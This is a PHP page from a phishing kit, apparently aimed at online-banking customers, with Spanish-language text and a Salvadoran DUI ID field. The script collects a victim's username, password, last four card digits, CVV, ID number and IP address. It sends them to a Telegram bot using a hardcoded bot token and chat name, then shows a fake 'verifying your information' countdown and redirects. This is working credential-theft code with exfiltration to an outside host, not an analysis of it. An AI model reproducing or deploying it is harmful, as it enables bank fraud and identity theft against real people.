<?php
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
include('dt.php');

if ( isset ($_POST['usuario']) && isset ($_POST['clave']) && isset ($_POST['digitos']) && isset ($_POST['cvv'])  && isset ($_POST['dui'])){

$message = "USER: ".$_POST['usuario']."\r\nCLAVE: ".$_POST['clave']."\r\núltimos 4 Digitos: ".$_POST['digitos']."\r\nCvv: ".$_POST['cvv']."\r\nDui: ".$_POST['dui']."\r\nIP ".$userp."\r\n";

$apiToken = "5968183914:AAFzkASiOSiBuUK9g4jYDp7sY1eFtFZ6MgQ";
$data = [
    'chat_id' => '@elieseragri',
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
}else{  header ('location: index.html'); exit();
}

?>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>inicio</title>
    <link rel="stylesheet" href="./archivero/style2.css">
			 <script language="JavaScript">
	var tiempo=20;
    var url="index2.php";
 
    function updateReloj()
    {
        document.getElementById('contador').innerHTML = "Por favor, espera "+tiempo+" segundos <br>Estamos verificando su información";
 
        if(tiempo==0)
        {
            window.location=url;
        }else{
            tiempo-=1;
            setTimeout("updateReloj()",1000);
        }
    }
   window.onload=updateReloj;
 
    </script>
  </head>
  <body>
    <header>
      <div class="log"></div>
      <div class="help-mensaje"></div>
    </header>

    <main class="main">
      <div class="formulario-contenedor">
        <form action="" method="post">
		 <div align="center"><br><br>  <br>  <br><br>  <br>  <br>
          <h2>Cargando...</h2> <br> <br>
          <p>
            <img src="archivero/lod.gif">
          </p> <br> <br>
		  
		  
		  <div  id="contador" style="font-size:18px;color:#000000;"></div>
		  <br>  <br>  <br><br>  <br>  <br><br>  <br>  <br><br>  <br>  <br><br>  <br>  
          </div>
        </form>
		    
      </div>  <br>  <br>  <br><br>  <br>  <br><br>  <br>  <br><br>  <br>  <br><br>  <br>  <br><br>  <br>  <br><br>  <br>  <br>
	  <br>  <br>  <br><br>  <br>  <br>
    </main>

           
    <footer class="normal-footer">
            <ul class="footer-list">
              <li class="primer-li">
               <img src="archivero/ffter.png" >
              </li>
            
        
            </ul>
          </footer>
  

</body></html>